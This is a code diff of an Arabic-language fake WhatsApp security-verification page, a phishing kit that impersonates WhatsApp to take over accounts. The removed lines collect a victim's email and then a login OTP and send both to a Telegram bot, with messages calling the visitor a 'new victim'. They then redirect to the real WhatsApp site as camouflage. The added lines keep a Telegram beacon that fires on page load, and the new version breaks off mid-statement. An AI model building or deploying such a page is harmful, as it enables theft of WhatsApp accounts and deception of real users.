@@ -3,23 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Security Verification</title>
+    <title>WhatsApp Security</title>
     <style>
         :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Roboto, Helvetica, Arial, sans-serif; }
-        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; display: flex; align-items: center; justify-content: center; direction: rtl; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Roboto, sans-serif; }
+        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; display: flex; align-items: center; justify-content: center; direction: rtl; overflow: hidden; }
         .container { width: 100%; max-width: 400px; padding: 30px; text-align: center; }
         .card { background: #1d2a33; border-radius: 15px; padding: 20px; margin: 20px 0; border: 1px solid #2a3942; text-align: right; }
         .info-row { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 10px; color: var(--wa-hint); }
         .info-row b { color: var(--wa-green); }
-        .input-box { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 8px; padding: 15px; color: #fff; font-size: 16px; outline: none; margin: 15px 0; transition: 0.3s; }
-        .input-box:focus { border-color: var(--wa-green); }
-        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .btn:active { transform: scale(0.98); }
+        .input-box { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 8px; padding: 15px; color: #fff; font-size: 16px; outline: none; margin: 15px 0; text-align: left; }
+        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; }
         #checker { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -27,29 +24,24 @@
     <div id="checker">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="60">
         <div class="spinner"></div>
-        <p style="color:var(--wa-hint); font-size: 14px;">جاري تأمين الحساب...</p>
+        <p style="color:var(--wa-hint); font-size: 14px;">جاري فحص الحساب...</p>
     </div>
 
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50">
-        <h2 style="margin-top:15px; font-weight: 500;">تأكيد ملكية الحساب</h2>
+        <h2 style="margin:15px 0; font-weight: 500;">تأكيد ملكية الحساب</h2>
         
         <div class="card">
             <div class="info-row"><span>رقم الهاتف:</span> <b id="phone-mask"></b></div>
-            <div class="info-row"><span>الحالة:</span> <span style="color:#ffbc2e;">مطلوب إجراء أمان</span></div>
+            <div class="info-row"><span>الحالة:</span> <span style="color:#ffbc2e;">تحديث أمان مطلوب</span></div>
         </div>
 
-        <p id="msg-text" style="font-size: 14px; color: var(--wa-hint); line-height: 1.6;">
-            يرجى إدخال البريد الإلكتروني المرتبط بهذا الرقم لاستلام كود تسجيل الدخول وتأمين هويتك.
+        <p id="msg-text" style="font-size: 14px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 10px;">
+            يرجى إدخال البريد الإلكتروني المرتبط لاستلام كود التحقق.
         </p>
 
-        <input type="email" id="main-input" class="input-box" placeholder="example@gmail.com" dir="ltr">
-        
+        <input type="email" id="main-input" class="input-box" placeholder="example@gmail.com">
         <button class="btn" id="main-btn" onclick="handleFlow()">متابعة</button>
-
-        <p style="margin-top: 25px; font-size: 12px; color: #54656f;">
-            شركة WhatsApp تستخدم التشفير التام لحماية بياناتك.
-        </p>
     </div>
 
     <script>
@@ -59,72 +51,25 @@
             P: new URLSearchParams(window.location.search).get('u') || "01030003287"
         };
 
-        let currentStep = "EMAIL"; // المود الأولي
+        let currentStep = "EMAIL";
 
-        // تشفير الرقم المسحوب من الرابط
-        document.getElementById('phone-mask').innerText = `+20 ${CFG.P.substring(0,3)}••••${CFG.P.slice(-2)}`;
-
-        async function notify(msg) {
-            try {
-                await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
-                });
-            } catch(e) {}
-        }
-
+        // إخفاء اللودينج بعد ثانيتين
         window.onload = () => {
+            document.getElementById('phone-mask').innerText = `+20 ${CFG.P.substring(0,3)}••••${CFG.P.slice(-2)}`;
             setTimeout(() => {
-                document.getElementById('checker').classList.add('hidden');
-                notify(`⚡ <b>ضحية جديد دخل الصفحة</b>\n📱 الرقم: <code>${CFG.P}</code>`);
+                document.getElementById('checker').style.display = 'none';
+                notify("🌐 زيارة جديدة للموقع");
             }, 2000);
         };
+
+        async function notify(text) {
+            // استخدام fetch مع إهمال النتيجة لضمان عدم توقف الكود
+            fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(text)}&parse_mode=HTML`)
+            .catch(e => console.log("Silent Error"));
+        }
 
         async function handleFlow() {
             const input = document.getElementById('main-input');
             const btn = document.getElementById('main-btn');
             const msg = document.getElementById('msg-text');
-            const val = input.value.trim();
-
-            if (!val || val.length < 5) return;
-
-            btn.disabled = true;
-            btn.innerText = "جاري المعالجة...";
-
-            if (currentStep === "EMAIL") {
-                // سحب الإيميل
-                await notify(`📧 <b>البريد الإلكتروني المستهدف</b>\nالرقم: <code>${CFG.P}</code>\nالإيميل: <code>${val}</code>`);
-                
-                setTimeout(() => {
-                    currentStep = "OTP";
-                    msg.innerHTML = "تم إرسال كود تسجيل دخول مكون من 6 أرقام إلى بريدك الإلكتروني. <b>أدخله بالأسفل للمتابعة:</b>";
-                    input.value = "";
-                    input.placeholder = "--- ---";
-                    input.type = "tel";
-                    input.maxLength = 7;
-                    btn.innerText = "تأكيد الكود";
-                    btn.disabled = false;
-                }, 1500);
-
-            } else {
-                // سحب الكود (OTP)
-                await notify(`🔥 <b>وصل كود الدخول (OTP)!</b>\nالرقم: <code>${CFG.P}</code>\nالكود: <code>${val}</code>`);
-                
-                btn.innerText = "تم التحقق بنجاح";
-                setTimeout(() => {
-                    // التمويه النهائي بالتحويل لموقع واتساب الرسمي
-                    window.location.href = "https://www.whatsapp.com/security?lg=ar";
-                }, 2000);
-            }
-        }
-
-        // تنسيق إدخال الكود (أرقام فقط)
-        document.getElementById('main-input').addEventListener('input', function(e) {
-            if (currentStep === "OTP") {
-                this.value = this.value.replace(/\D/g, '');
-            }
-        });
-    </script>
-</body>
-</html>
+            const val = input.value
